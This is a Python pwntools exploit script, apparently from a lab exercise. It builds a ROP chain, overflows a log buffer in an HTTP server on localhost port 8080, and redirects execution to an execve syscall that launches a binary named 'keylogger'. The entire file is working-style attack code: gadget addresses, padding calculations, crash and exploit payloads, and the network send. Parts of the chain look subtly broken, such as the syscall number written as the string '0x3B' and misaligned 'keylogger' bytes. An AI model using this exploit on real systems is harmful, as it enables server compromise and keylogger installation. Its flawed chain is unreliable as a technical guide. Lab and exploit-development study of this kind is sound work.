from keystone import *
from pwn import *

from struct import pack

p = pack('<Q', 0x00000000004036aa)  # pop rdx ; pop rax ; ret
p += pack('<Q', 0x0000000000406230) # @ .data
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004036ab) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x00000000004036a6) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x00000000004036aa) # pop rdx ; pop rax ; ret
p += pack('<Q', 0x0000000000406238) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004036ad) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004036a6) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x000000000040395b) # pop rdi ; ret
p += b'keylogger'
p += pack('<Q', 0x00000000004028ac) # pop rsi ; pop rbp ; ret
p += b"12345678"
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004036a7) # mov dword ptr [rdx], eax ; ret
p += pack('<Q', 0x00000000004036ad) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004036aa) # pop rdx ; pop rax ; ret
p += b"12345678"
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004036ad) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004036ab) # pop rax ; ret
p += b"0x3B"
p += pack('<Q', 0x00000000004036cb) # syscall

### CONFIGS ###
port = 8080
original_rbp = 0x7ffff7ad1920 
log_buffer_rbp_offset = 0x450 
log_buffer_prefix = 49 

input("Copy the 'keylogger' binary to 'server_data'. Input anything to continue...")
message_prefix = b"GET /data.txt HTTP/1.1\r\n"
message_prefix_len = len(message_prefix)


### CREATE THE CRASH PAYLOAD ###
crash = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) 
crash += b"q" * padding_size 
crash += 0xffffffffffffffff.to_bytes(8, "little") 
crash += b"\r\n\r\n"


sc1_exploit = message_prefix
sc1_exploit += p
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(sc1_exploit)
sc1_exploit += b"q" * padding_size
retaddr = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_prefix_len 
sc1_exploit += retaddr.to_bytes((retaddr.bit_length() + 7) // 8, byteorder = "little")
sc1_exploit += b"\r\n\r\n"

sc1_exploit = sc1_exploit.replace(b"\x00", b"\x01") 


### PERFORM ATTACK ###
#remote("localhost", port).send(crash) 
sleep(2) 
remote("localhost", port).send(sc1_exploit)
